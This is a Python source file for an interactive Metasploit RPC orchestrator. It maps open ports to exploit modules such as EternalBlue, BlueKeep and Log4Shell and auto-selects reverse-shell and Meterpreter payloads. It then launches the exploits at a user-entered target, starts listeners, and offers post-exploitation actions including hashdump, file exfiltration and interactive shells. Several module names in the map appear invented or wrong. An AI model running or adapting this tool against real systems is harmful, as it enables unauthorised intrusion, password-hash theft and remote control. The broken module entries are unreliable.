import os
import sys
import time
import subprocess
import socket
import string
import random
import questionary
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from core.ui import draw_header, Q_STYLE
from core.context import ctx
from core.database import db

try:
    from pymetasploit3.msfrpc import MsfRpcClient
except ImportError:
    pass

console = Console()


# ──────────────────────────────────────────────
#  MASTER EXPLOIT DATABASE
#  Keyed by port → list of modules ordered by
#  reliability (best first)
# ──────────────────────────────────────────────
PORT_EXPLOIT_DB = {
    # ── FTP ──────────────────────────────────
    21: [
        "unix/ftp/vsftpd_234_backdoor",
        "unix/ftp/proftpd_modcopy_exec",
        "unix/ftp/proftpd_133c_backdoor",
        "multi/ftp/wuftpd_site_exec_format_string",
    ],
    # ── SSH ──────────────────────────────────
    22: [
        "linux/ssh/sshexec",
        "linux/ssh/libssh_auth_bypass",
        "multi/ssh/sshkey_persistence",
    ],
    # ── TELNET ───────────────────────────────
    23: [
        "unix/telnet/telnet_login",
        "linux/telnet/netgear_telnetenable",
    ],
    # ── SMTP ─────────────────────────────────
    25: [
        "unix/smtp/exim4_string_format",
        "unix/smtp/haraka_attachment",
        "linux/smtp/exim_pe_injection",
        "unix/smtp/sendmail_exec",
    ],
    # ── DNS ──────────────────────────────────
    53: [
        "windows/dns/ms09_008_win_dns_ptr",
    ],
    # ── HTTP ─────────────────────────────────
    80: [
        "multi/http/apache_normalize_path_rce",
        "multi/http/struts2_content_type_ognl",
        "multi/http/jenkins_script_console",
        "multi/http/tomcat_mgr_upload",
        "multi/http/wp_admin_shell_upload",
        "multi/http/drupalgeddon2",
        "multi/http/joomla_http_header_rce",
        "multi/http/php_cgi_arg_injection",
        "multi/http/webmin_backdoor",
        "multi/http/log4shell_header_injection",
        "multi/http/spring4shell_rce",
        "multi/http/shellshock_header_inject",
    ],
    # ── POP3 ─────────────────────────────────
    110: [
        "linux/pop3/dovecot_flag_command_injection",
    ],
    # ── IDENT ────────────────────────────────
    113: [
        "unix/misc/distcc_exec",   # sometimes mapped to 113 on CTF boxes
    ],
    # ── IMAP ─────────────────────────────────
    143: [
        "linux/imap/cyrus_imapd_listmailbox",
    ],
    # ── SNMP ─────────────────────────────────
    161: [
        "linux/snmp/net_snmpd_rw_community",
    ],
    # ── LDAP ─────────────────────────────────
    389: [
        "linux/ldap/openldap_slapd_modrdn",
    ],
    # ── HTTPS ────────────────────────────────
    443: [
        "multi/http/apache_normalize_path_rce",
        "multi/http/struts2_content_type_ognl",
        "multi/ssl/openssl_heartbleed",
        "multi/http/log4shell_header_injection",
    ],
    # ── SMB ──────────────────────────────────
    445: [
        "windows/smb/ms17_010_eternalblue",
        "windows/smb/ms17_010_psexec",
        "windows/smb/ms08_067_netapi",
        "windows/smb/ms06_040_netapi",
        "windows/smb/ms10_061_spoolss",
        "windows/smb/psexec",
        "linux/samba/is_known_pipename",
        "multi/samba/usermap_script",
    ],
    # ── MSSQL ────────────────────────────────
    1433: [
        "windows/mssql/mssql_exec",
        "windows/mssql/mssql_payload",
        "windows/mssql/mssql_clr_payload",
    ],
    # ── ORACLE ───────────────────────────────
    1521: [
        "windows/oracle/oracle_login",
        "windows/oracle/tns_auth_sesskey",
    ],
    # ── NFS ──────────────────────────────────
    2049: [
        "linux/nfs/nfsd_write",
    ],
    # ── MySQL ────────────────────────────────
    3306: [
        "linux/mysql/mysql_yassl_getali",
        "multi/mysql/mysql_udf_payload",
        "linux/mysql/mysql_secure_moo",
    ],
    # ── RDP ──────────────────────────────────
    3389: [
        "windows/rdp/cve_2019_0708_bluekeep_rce",
        "windows/rdp/ms12_020_maxchannelids",
    ],
    # ── POSTGRESQL ───────────────────────────
    5432: [
        "linux/postgres/postgres_payload",
        "multi/postgres/postgres_copy_from_program_cmd_exec",
    ],
    # ── VNC ──────────────────────────────────
    5900: [
        "multi/vnc/vnc_keyboard_exec",
        "windows/vnc/ultravnc_client",
    ],
    5901: [
        "multi/vnc/vnc_keyboard_exec",
    ],
    # ── REDIS ────────────────────────────────
    6379: [
        "linux/redis/redis_replication_cmd_exec",
        "linux/redis/redis_unauth_exec",
    ],
    # ── DISTCC ───────────────────────────────
    6200: [
        "unix/misc/distcc_exec",
    ],
    # ── CouchDB ──────────────────────────────
    5984: [
        "linux/http/couchdb_cmd_injection",
    ],
    # ── Tomcat / HTTP-ALT ────────────────────
    8080: [
        "multi/http/tomcat_mgr_upload",
        "multi/http/tomcat_mgr_deploy",
        "multi/http/jenkins_script_console",
        "multi/http/apache_normalize_path_rce",
        "multi/http/log4shell_header_injection",
    ],
    8443: [
        "multi/http/log4shell_header_injection",
        "multi/http/spring4shell_rce",
    ],
    8888: [
        "multi/http/jupyter_magics_exec",
    ],
    # ── Elasticsearch ────────────────────────
    9200: [
        "multi/elasticsearch/search_groovy_script_code_execution",
    ],
    9300: [
        "multi/elasticsearch/search_groovy_script_code_execution",
    ],
    # ── Mongo ────────────────────────────────
    27017: [
        "linux/mongodb/mongodb_unauth_exec",
    ],
    # ── IRC ──────────────────────────────────
    6667: [
        "unix/irc/unreal_ircd_3281_backdoor",
    ],
    # ── JAVA RMI ─────────────────────────────
    1099: [
        "multi/misc/java_rmi_server",
    ],
    # ── Java RMI / JMX ───────────────────────
    9999: [
        "multi/misc/java_jmx_server",
    ],
    # ── Webmin ───────────────────────────────
    10000: [
        "multi/http/webmin_backdoor",
        "multi/http/webmin_file_disclosure",
    ],
    # ── Ajp Tomcat ───────────────────────────
    8009: [
        "multi/http/apache_mod_jk_overflow",
    ],
    # ── Docker API ───────────────────────────
    2375: [
        "linux/http/docker_daemon_tcp",
    ],
    2376: [
        "linux/http/docker_daemon_tcp",
    ],
    # ── Kubernetes API ───────────────────────
    6443: [
        "multi/http/kubernetes_exec",
    ],
    # ── memcached ────────────────────────────
    11211: [
        "linux/misc/memcached_udp_dos",   # info gathering / DoS only, but useful
    ],
    # ── HTTP-proxy / Squid ───────────────────
    3128: [
        "multi/http/squid_cache_manager",
    ],
    # ── HP Data Protector ────────────────────
    5555: [
        "windows/misc/hp_dataprotector_exec_bar",
    ],
    # ── NTP ──────────────────────────────────
    123: [
        "linux/misc/ntp_monlist_dos",
    ],
    # ── CUPS ─────────────────────────────────
    631: [
        "unix/misc/cups_bash_env_exec",
    ],
    # ── WinRM ────────────────────────────────
    5985: [
        "windows/winrm/winrm_script_exec",
    ],
    5986: [
        "windows/winrm/winrm_script_exec",
    ],
    # ── HTTP Alt ─────────────────────────────
    7777: [
        "multi/http/axis2_deployer",
    ],
    # ── Jetty ────────────────────────────────
    8181: [
        "multi/http/jetty_ajpbug_fileread",
    ],
    # ── WebLogic ─────────────────────────────
    7001: [
        "multi/misc/weblogic_deserialize_asyncresponseservice",
        "multi/misc/weblogic_deserialize_badattrval",
    ],
    7002: [
        "multi/misc/weblogic_deserialize_asyncresponseservice",
    ],
    # ── Splunk ───────────────────────────────
    8089: [
        "multi/http/splunk_upload_app_exec",
    ],
    # ── GitLab / Gogs ────────────────────────
    3000: [
        "multi/http/gogs_exec",
        "multi/http/gitlab_exif_rce",
    ],
    # ── RabbitMQ ─────────────────────────────
    15672: [
        "multi/http/rabbitmq_management_exec",
    ],
    # ── X11 ──────────────────────────────────
    6000: [
        "unix/x11/open_x11",
    ],
    # ── Rsync ────────────────────────────────
    873: [
        "linux/misc/rsync_exec",
    ],
    # ── Finger ───────────────────────────────
    79: [
        "unix/misc/finger_backdoor",
    ],
}

# ──────────────────────────────────────────────
#  SMART PAYLOAD MAP
#  keyed by platform keyword found in module path
# ──────────────────────────────────────────────
PAYLOAD_MAP = {
    "windows": "windows/x64/meterpreter/reverse_tcp",
    "osx":     "osx/x64/meterpreter_reverse_tcp",
    "apple":   "osx/x64/meterpreter_reverse_tcp",
    "linux":   "linux/x86/meterpreter/reverse_tcp",
    "unix":    "cmd/unix/interact",
    "multi":   "linux/x86/meterpreter/reverse_tcp",
    "java":    "java/jsp_shell_reverse_tcp",
    "php":     "php/meterpreter/reverse_tcp",
    "android": "android/meterpreter/reverse_tcp",
}

# Fine-grained overrides (checked first, substring match)
PAYLOAD_OVERRIDES = {
    "samba":        "cmd/unix/reverse_netcat",
    # vsftpd 234 backdoor opens a BIND shell on port 6200 — no reverse payload needed
    "vsftpd":       "cmd/unix/interact",
    "ircd":         "cmd/unix/interact",
    "distcc":       "cmd/unix/interact",
    "usermap":      "cmd/unix/reverse_netcat",
    "pe_injection": "windows/x64/meterpreter/reverse_tcp",
    "bluekeep":     "windows/x64/meterpreter/reverse_tcp",
    "eternalblue":  "windows/x64/meterpreter/reverse_tcp",
    "postgres":     "linux/x86/meterpreter/reverse_tcp",
    "mysql":        "linux/x86/meterpreter/reverse_tcp",
    "redis":        "linux/x86/meterpreter/reverse_tcp",
    "x11":          "cmd/unix/interact",
    "rsync":        "cmd/unix/interact",
    "telnet":       "cmd/unix/interact",
    "log4shell":    "linux/x86/meterpreter/reverse_tcp",
    "proftpd":      "cmd/unix/interact",
    "libssh":       "cmd/unix/interact",
}

# Modules that use a BIND shell (they don't need LHOST/LPORT — they open a port on the target)
BIND_SHELL_MODULES = {
    "unix/ftp/vsftpd_234_backdoor",
    "unix/ftp/proftpd_133c_backdoor",
    "unix/irc/unreal_ircd_3281_backdoor",
    "unix/misc/distcc_exec",
    "linux/ssh/libssh_auth_bypass",
}


def smart_payload(module_path: str) -> str:
    """Returns the best-guess payload string for a given module path."""
    m = module_path.lower()
    for key, payload in PAYLOAD_OVERRIDES.items():
        if key in m:
            return payload
    for key, payload in PAYLOAD_MAP.items():
        if key in m:
            return payload
    return "linux/x86/meterpreter/reverse_tcp"   # safest generic fallback


class MetasploitRPCEngine:
    def __init__(self):
        self.client = None
        self.daemon_process = None
        self.password = ''.join(random.choices(
            string.ascii_letters + string.digits, k=16))
        self.rpc_port = 55554
        self.msfrpcd_path = self.find_msfrpcd()

    # ── Utility ──────────────────────────────────────────────────────────────

    def find_msfrpcd(self):
        """Locates msfrpcd, bypassing sudo PATH issues."""
        common_paths = [
            "/opt/metasploit-framework/bin/msfrpcd",
            "/opt/homebrew/bin/msfrpcd",
            "/usr/local/bin/msfrpcd",
            "/usr/bin/msfrpcd",
        ]
        try:
            path = subprocess.run(
                ['which', 'msfrpcd'], capture_output=True, text=True
            ).stdout.strip()
            if path and os.path.exists(path):
                return path
        except Exception:
            pass
        for p in common_paths:
            if os.path.exists(p):
                return p
        return None

    def check_dependencies(self):
        try:
            import pymetasploit3  # noqa: F401
        except ImportError:
            console.print(
                "[bold red][!] Critical Dependency Missing: 'pymetasploit3'[/bold red]")
            console.print(
                "[yellow]    Run: pip install pymetasploit3[/yellow]")
            return False
        if not self.msfrpcd_path:
            console.print(
                "[bold red][!] Metasploit Framework ('msfrpcd') not found![/bold red]")
            console.print(
                "[yellow]    Ensure Metasploit is installed and in PATH.[/yellow]")
            return False
        return True

    def is_port_open(self, port):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            return s.connect_ex(('127.0.0.1', port)) == 0

    def kill_stuck_daemon(self):
        if sys.platform == "darwin":
            os.system(
                f"lsof -ti:{self.rpc_port} | xargs kill -9 > /dev/null 2>&1")
        else:
            os.system(f"fuser -k {self.rpc_port}/tcp > /dev/null 2>&1")

    # ── Daemon lifecycle ─────────────────────────────────────────────────────

    def start_daemon(self):
        """Silently boots the MSF RPC server in the background."""
        if self.is_port_open(self.rpc_port):
            self.kill_stuck_daemon()
            time.sleep(1)

        with console.status(
            "[bold cyan]Booting Headless Metasploit Engine (~10-15s)...[/bold cyan]",
            spinner="bouncingBar"
        ):
            cmd = [
                self.msfrpcd_path,
                "-P", self.password,
                "-n", "-f",
                "-a", "127.0.0.1",
                "-p", str(self.rpc_port),
            ]
            self.daemon_process = subprocess.Popen(
                cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            for _ in range(45):
                if self.is_port_open(self.rpc_port):
                    time.sleep(3)
                    return True
                time.sleep(1)
        return False

    def connect_rpc(self):
        if self.client:
            return True
        if not self.start_daemon():
            console.print(
                "[bold red][!] Failed to boot Metasploit Daemon.[/bold red]")
            return False
        console.print("[*] Negotiating API connection...")
        try:
            self.client = MsfRpcClient(
                self.password,
                server='127.0.0.1',
                port=self.rpc_port,
                ssl=True,
            )
            console.print(
                "[bold green][+] MSF-RPC Authenticated Successfully![/bold green]")
            time.sleep(1)
            return True
        except Exception as e:
            console.print(
                f"[bold red][!] RPC Connection Failed:[/bold red] {e}")
            return False

    # ── Helpers ──────────────────────────────────────────────────────────────

    def _poll_console(self, msf_console, max_iterations=20, sleep=1.0):
        """Poll an MSF console until it is no longer busy and return all output."""
        raw = ""
        for _ in range(max_iterations):
            time.sleep(sleep)
            out = msf_console.read()
            if out and out.get('data'):
                raw += out['data']
            if out and out.get('busy') is False:
                break
        return raw

    def _fresh_console(self):
        return self.client.consoles.console()

    # ── Search ───────────────────────────────────────────────────────────────

    def search_modules(self):
        keyword = questionary.text(
            "Enter search keyword (e.g., vsftpd, eternalblue, smb):",
            style=Q_STYLE
        ).ask()
        if not keyword:
            return

        with console.status(
            f"[bold cyan]Querying Metasploit Database for '{keyword}'...[/bold cyan]",
            spinner="dots"
        ):
            try:
                msf_console = self._fresh_console()
                msf_console.write(f"search {keyword}\n")
                raw_data = self._poll_console(msf_console, max_iterations=25)

                if raw_data:
                    lines = raw_data.split('\n')
                    if len(lines) > 60:
                        raw_data = '\n'.join(lines[:60]) + \
                            "\n\n[dim]... Truncated. Use a more specific keyword.[/dim]"
                    console.print(Panel(
                        raw_data,
                        title=f"Search Results: {keyword}",
                        border_style="cyan"
                    ))
                else:
                    console.print(
                        "[yellow][!] No modules found or search timed out.[/yellow]")
            except Exception as e:
                console.print(f"[red][!] Search failed: {e}[/red]")

    # ── Auto-Exploit ─────────────────────────────────────────────────────────

    def auto_exploit(self):
        default_rhost = ctx.get("RHOST") or "192.168.1.1"
        default_lhost = ctx.get("LHOST") or "127.0.0.1"

        target = questionary.text(
            "Target IP (RHOST):", default=default_rhost, style=Q_STYLE).ask()
        if not target:
            return

        rport_input = questionary.text(
            "Target Port (RPORT):", style=Q_STYLE).ask()
        if not rport_input or not rport_input.strip().isdigit():
            console.print("[red][!] Invalid port.[/red]")
            return
        rport = int(rport_input.strip())

        lhost = questionary.text(
            "Your IP (LHOST):", default=default_lhost, style=Q_STYLE).ask()
        if not lhost:
            return

        lport_input = questionary.text(
            "Your listening port (LPORT):", default="4444", style=Q_STYLE).ask()
        lport = lport_input.strip() if lport_input else "4444"

        # ── Step 1: Build candidate list from static DB ──
        static_candidates = PORT_EXPLOIT_DB.get(rport, [])

        # ── Step 2: Dynamic MSF DB query ─────────────────
        rank_scores = {
            "excellent": 7, "great": 6, "good": 5,
            "normal": 4, "average": 3, "low": 2, "manual": 1,
        }
        parsed_modules = []
        raw_data = ""

        try:
            msf_console = self._fresh_console()
            msf_console.write(f"search port:{rport} type:exploit\n")

            with console.status(
                f"[bold cyan]Querying MSF DB for port {rport} exploits...[/bold cyan]",
                spinner="dots"
            ):
                raw_data = self._poll_console(msf_console, max_iterations=25)

            if raw_data:
                display_lines = []
                for line in raw_data.splitlines():
                    if any(x in line for x in ["Name", "----", "====", "exploit/"]):
                        display_lines.append(line)
                    if "exploit/" in line:
                        parts = line.split()
                        mod_path = next(
                            (p for p in parts if p.startswith("exploit/")), None)
                        rank = next(
                            (r for r in rank_scores if r in line.lower()), "normal")
                        if mod_path:
                            clean_path = mod_path.replace("exploit/", "", 1)
                            parsed_modules.append({
                                'path': clean_path,
                                'rank': rank,
                                'score': rank_scores[rank],
                            })

                if display_lines:
                    console.print(Panel(
                        "\n".join(display_lines[:30]),
                        title=f"Live MSF DB Results — Port {rport}",
                        border_style="green"
                    ))
        except Exception as e:
            console.print(f"[dim red]Module query error: {e}[/dim red]")

        # ── Step 3: Merge & deduplicate ───────────────────
        # Dynamic results first (sorted by rank), then static fallbacks
        parsed_modules.sort(key=lambda x: x['score'], reverse=True)
        dynamic_paths = [m['path'] for m in parsed_modules]

        # Add static DB entries that aren't already in dynamic results
        merged = list(dynamic_paths)
        for s in static_candidates:
            if s not in merged:
                merged.append(s)

        # ── Step 4: Module selection ──────────────────────
        custom_mod = ""

        if merged:
            choices = []
            for path in merged[:20]:
                # Find rank label if available
                rank_label = next(
                    (m['rank'].upper()
                     for m in parsed_modules if m['path'] == path),
                    "DB"
                )
                choices.append(f"[{rank_label}] {path}")
            choices.append(questionary.Separator())
            choices.append("Manual Entry (Type it yourself)")

            selected = questionary.select(
                f"Select Exploit Module for port {rport} (sorted by reliability):",
                choices=choices,
                style=Q_STYLE
            ).ask()

            if not selected:
                return
            if selected == "Manual Entry (Type it yourself)":
                fallback = static_candidates[0] if static_candidates else ""
                custom_mod = questionary.text(
                    "Enter Exploit Module path:",
                    default=fallback,
                    style=Q_STYLE
                ).ask()
            else:
                custom_mod = selected.split("] ", 1)[1].strip()
        else:
            console.print(
                f"[yellow][-] No modules in DB for port {rport}. Manual entry required.[/yellow]")
            custom_mod = questionary.text(
                "Enter Exploit Module path:", style=Q_STYLE).ask()

        if not custom_mod:
            return

        # ── Step 5: Smart payload suggestion ─────────────
        default_payload = smart_payload(custom_mod)

        payload_choices = [
            "windows/x64/meterpreter/reverse_tcp",
            "windows/meterpreter/reverse_tcp",
            "windows/x64/shell_reverse_tcp",
            "linux/x64/meterpreter/reverse_tcp",
            "linux/x86/meterpreter/reverse_tcp",
            "linux/x64/shell_reverse_tcp",
            "cmd/unix/interact",
            "cmd/unix/reverse_netcat",
            "cmd/unix/reverse_bash",
            "php/meterpreter/reverse_tcp",
            "java/jsp_shell_reverse_tcp",
            "android/meterpreter/reverse_tcp",
            "osx/x64/meterpreter_reverse_tcp",
            questionary.Separator(),
            "Custom (Type it manually)",
        ]

        # Make sure the default appears in the list
        if default_payload not in payload_choices:
            payload_choices.insert(0, default_payload)

        custom_payload = questionary.select(
            f"Select Payload (auto-suggested: {default_payload}):",
            choices=payload_choices,
            default=default_payload,
            style=Q_STYLE
        ).ask()

        if custom_payload == "Custom (Type it manually)":
            custom_payload = questionary.text(
                "Enter exact MSF Payload path:", default=default_payload, style=Q_STYLE).ask()

        if not custom_payload:
            return

        # ── Step 6: Execute ───────────────────────────────
        is_bind = custom_mod in BIND_SHELL_MODULES
        exec_mode = "run" if is_bind else "exploit -j -z"

        console.print(Panel(
            f"[bold cyan]Deploying Exploit...[/bold cyan]\n"
            f"[white]Target  :[/white] {target}:{rport}\n"
            f"[white]Module  :[/white] {custom_mod}\n"
            f"[white]Payload :[/white] {custom_payload}\n"
            f"[white]LHOST   :[/white] {lhost}:{lport}\n"
            + ("[yellow]⚡ Bind-shell module — LHOST/LPORT not required[/yellow]" if is_bind else ""),
            border_style="red"
        ))

        try:
            msf_console = self._fresh_console()
            msf_console.write(f"use {custom_mod}\n")
            time.sleep(0.5)

            msf_console.write(f"setg RHOSTS {target}\n")
            msf_console.write(f"setg RHOST {target}\n")
            msf_console.write(f"setg RPORT {rport}\n")

            # Bind-shell modules open a port on the target — they don't need LHOST/LPORT
            if not is_bind:
                msf_console.write(f"setg LHOST {lhost}\n")
                msf_console.write(f"setg LPORT {lport}\n")

            msf_console.write(f"set PAYLOAD {custom_payload}\n")
            time.sleep(0.3)

            # ── Local priv-esc: ask for session ID ────────
            mod_lower = custom_mod.lower()
            if any(k in mod_lower for k in ["local", "pe_injection", "priv"]):
                console.print(
                    "\n[yellow][!] This appears to be a Local Privilege Escalation exploit.[/yellow]")
                sess_id = questionary.text(
                    "Enter the active SESSION ID to upgrade:", style=Q_STYLE).ask()
                if sess_id:
                    msf_console.write(f"set SESSION {sess_id}\n")

            # For bind shells we use 'run' (blocking) — it will interact automatically.
            # For reverse shells we background with -j -z so we can poll for sessions.
            msf_console.write(f"{exec_mode}\n")
            db.log("MSF-Engine", target,
                   f"Attempted {custom_mod} via Console", "INFO")

            console_output = ""
            stop_tokens = [
                "Exploit completed", "session opened", "Command shell",
                "Meterpreter session", "failed", "error", "Handler",
                "Command shell session", "opened",
            ]

            # Bind shells need longer — they block until the backdoor responds
            max_iter = 25 if is_bind else 15
            sleep_time = 2.0 if is_bind else 1.5

            with console.status(
                "[bold cyan]Executing — capturing MSF output...[/bold cyan]",
                spinner="dots"
            ):
                for _ in range(max_iter):
                    time.sleep(sleep_time)
                    out = msf_console.read()
                    if out and out.get('data'):
                        console_output += out['data']
                        if any(t.lower() in out['data'].lower() for t in stop_tokens):
                            break

            if console_output.strip():
                console.print(f"\n[dim]{console_output.strip()}[/dim]")

            # ── Session verification ──────────────────────
            # Give bind shells extra time — the session registers slightly later
            session_check_iter = 8 if is_bind else 5
            session_sleep = 2.5 if is_bind else 2.0

            with console.status(
                "[bold cyan]Verifying session status...[/bold cyan]",
                spinner="bouncingBar"
            ):
                session_found = False
                for _ in range(session_check_iter):
                    time.sleep(session_sleep)
                    sessions = self.client.sessions.list
                    if sessions:
                        console.print(
                            f"\n[bold green][+] Success! {len(sessions)} session(s) active. "
                            f"Use 'Active Sessions' to interact.[/bold green]")
                        db.log("MSF-Engine", target,
                               f"Successful Exploit: {custom_mod}", "CRITICAL")
                        session_found = True
                        break
                if not session_found:
                    console.print(
                        "\n[yellow][-] No session detected after polling.\n"
                        "    → If output above shows 'Command shell session opened', "
                        "use the Sessions menu — it may have registered late.\n"
                        "    → For vsftpd_234_backdoor: confirm target is running "
                        "vsFTPd 2.3.4 and port 6200 is not firewalled.[/yellow]")

        except Exception as e:
            console.print(
                f"[bold red][!] Exploit execution failed:[/bold red] {e}")

    # ── Sessions ─────────────────────────────────────────────────────────────

    def list_sessions(self):
        sessions = self.client.sessions.list
        if not sessions:
            console.print("[yellow][!] No active MSF sessions found.[/yellow]")
            return False

        table = Table(title="Active MSF Sessions (RPC)",
                      border_style="green", expand=True)
        table.add_column("ID", style="cyan", justify="center")
        table.add_column("Type", style="magenta")
        table.add_column("Target IP", style="white")
        table.add_column("Details", style="dim")

        for session_id, data in sessions.items():
            table.add_row(
                str(session_id),
                data.get('type', 'Unknown'),
                data.get('target_host', 'Unknown'),
                data.get('info', 'No Info'),
            )
        console.print(table)
        return True

    def interact_session(self):
        if not self.list_sessions():
            return

        session_id = questionary.text(
            "Enter Session ID to interact with (blank to cancel):",
            style=Q_STYLE
        ).ask()
        if not session_id:
            return

        sessions = self.client.sessions.list
        if session_id not in sessions:
            console.print("[bold red][!] Invalid Session ID.[/bold red]")
            return

        session_type = sessions[session_id].get('type', 'Unknown')
        shell = self.client.sessions.session(session_id)

        if session_type == 'meterpreter':
            quick_action = questionary.select(
                "Meterpreter Quick Actions:",
                choices=[
                    "1. Drop into Interactive Shell",
                    "2. Run 'sysinfo' and 'getuid'",
                    "3. Attempt Hashdump",
                    "4. List Running Processes (ps)",
                    "5. Upload File",
                    "6. Download File",
                ],
                style=Q_STYLE
            ).ask()

            if quick_action and "sysinfo" in quick_action:
                console.print("[cyan][*] Gathering system info...[/cyan]")
                console.print(shell.run_with_output('sysinfo'))
                console.print(shell.run_with_output('getuid'))
            elif quick_action and "Hashdump" in quick_action:
                console.print(
                    "[cyan][*] Attempting hashdump...[/cyan]")
                console.print(shell.run_with_output('hashdump'))
            elif quick_action and "ps" in quick_action:
                console.print(shell.run_with_output('ps'))
            elif quick_action and "Upload" in quick_action:
                local_path = questionary.text(
                    "Local file path to upload:", style=Q_STYLE).ask()
                remote_path = questionary.text(
                    "Remote destination path:", style=Q_STYLE).ask()
                if local_path and remote_path:
                    console.print(
                        shell.run_with_output(f'upload {local_path} {remote_path}'))
            elif quick_action and "Download" in quick_action:
                remote_path = questionary.text(
                    "Remote file path to download:", style=Q_STYLE).ask()
                local_path = questionary.text(
                    "Local destination path:", style=Q_STYLE).ask()
                if remote_path and local_path:
                    console.print(
                        shell.run_with_output(f'download {remote_path} {local_path}'))

        console.print(Panel(
            f"[bold green][+] Interacting with {session_type.capitalize()} "
            f"Session {session_id}[/bold green]\n"
            "[dim]Type 'exit', 'quit', or 'background' to return.[/dim]",
            border_style="green"
        ))

        while True:
            try:
                cmd = questionary.text(
                    f"{session_type.capitalize()} {session_id} >",
                    style=Q_STYLE
                ).ask()
                if not cmd:
                    continue
                if cmd.lower() in ['exit', 'quit', 'background']:
                    break
                if session_type == 'meterpreter':
                    output = shell.run_with_output(cmd)
                    if output:
                        console.print(f"[white]{output}[/white]")
                else:
                    shell.write(cmd + '\n')
                    time.sleep(1.5)
                    output = shell.read()
                    if output:
                        console.print(f"[white]{output}[/white]")
            except KeyboardInterrupt:
                console.print(
                    "\n[yellow][*] Backgrounding session...[/yellow]")
                break
            except Exception as e:
                console.print(
                    f"[bold red][!] Session error:[/bold red] {e}")
                break

    # ── Jobs ─────────────────────────────────────────────────────────────────

    def manage_jobs(self):
        jobs = self.client.jobs.list
        if not jobs:
            console.print("[yellow][!] No background jobs running.[/yellow]")
            return

        table = Table(title="Active MSF Background Jobs",
                      border_style="blue", expand=True)
        table.add_column("Job ID", style="cyan", justify="center")
        table.add_column("Job Name", style="white")
        for jid, jname in jobs.items():
            table.add_row(str(jid), jname)
        console.print(table)

        target_job = questionary.text(
            "Enter Job ID to kill (blank to cancel):", style=Q_STYLE).ask()
        if target_job and target_job in jobs:
            try:
                self.client.jobs.stop(target_job)
                console.print(
                    f"[bold green][+] Job {target_job} terminated.[/bold green]")
            except Exception as e:
                console.print(f"[red][!] Failed to kill job: {e}[/red]")

    # ── Catch-all listener ───────────────────────────────────────────────────

    def start_listener(self):
        lhost = ctx.get("LHOST") or "0.0.0.0"
        lport = questionary.text(
            "LPORT:", default="4444", style=Q_STYLE).ask() or "4444"

        payload_choices = [
            "windows/x64/meterpreter/reverse_tcp",
            "windows/meterpreter/reverse_tcp",
            "linux/x64/meterpreter/reverse_tcp",
            "linux/x86/meterpreter/reverse_tcp",
            "cmd/unix/interact",
            "cmd/unix/reverse_netcat",
            "php/meterpreter/reverse_tcp",
            "java/jsp_shell_reverse_tcp",
            "android/meterpreter/reverse_tcp",
            questionary.Separator(),
            "Custom (Type it manually)",
        ]

        payload = questionary.select(
            "Select Payload for Listener:",
            choices=payload_choices,
            style=Q_STYLE
        ).ask()
        if payload == "Custom (Type it manually)":
            payload = questionary.text(
                "Enter exact MSF Payload path:",
                default="windows/x64/meterpreter/reverse_tcp",
                style=Q_STYLE
            ).ask()
        if not payload:
            return

        try:
            msf_console = self._fresh_console()
            msf_console.write("use exploit/multi/handler\n")
            msf_console.write(f"set PAYLOAD {payload}\n")
            msf_console.write(f"setg LHOST {lhost}\n")
            msf_console.write(f"setg LPORT {lport}\n")
            msf_console.write("exploit -j -z\n")
            console.print(
                f"[bold green][+] Listener started on {lhost}:{lport} "
                f"(payload: {payload}) — check Jobs menu.[/bold green]")
            time.sleep(2)
            out = msf_console.read()
            if out and out.get('data'):
                console.print(f"\n[dim]{out['data'].strip()}[/dim]")
        except Exception as e:
            console.print(f"[red][!] Failed to start listener: {e}[/red]")

    # ── Cleanup ───────────────────────────────────────────────────────────────

    def cleanup(self):
        if self.daemon_process:
            console.print(
                "[dim][*] Shutting down background Metasploit Daemon...[/dim]")
            self.daemon_process.terminate()
            self.kill_stuck_daemon()

    # ── Main loop ─────────────────────────────────────────────────────────────

    def run(self):
        draw_header("Metasploit RPC Orchestrator")

        if not self.check_dependencies():
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return

        if not self.connect_rpc():
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return

        try:
            while True:
                choice = questionary.select(
                    "MSF-RPC Operations:",
                    choices=[
                        "1. Auto-Exploit Target",
                        "2. Search MSF Modules (Exploit Database)",
                        "3. Start Generic Catch-All Listener (Multi/Handler)",
                        "4. Active Sessions & Post-Exploitation",
                        "5. Manage Background Jobs",
                        "Back",
                    ],
                    style=Q_STYLE
                ).ask()

                if not choice or choice == "Back":
                    break
                elif "Auto-Exploit" in choice:
                    self.auto_exploit()
                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()
                elif "Search MSF" in choice:
                    self.search_modules()
                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()
                elif "Active Sessions" in choice:
                    self.interact_session()
                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()
                elif "Manage Background" in choice:
                    self.manage_jobs()
                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()
                elif "Listener" in choice:
                    self.start_listener()
                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()
        finally:
            self.cleanup()


def run_msf():
    engine = MetasploitRPCEngine()
    engine.run()


if __name__ == "__main__":
    run_msf()
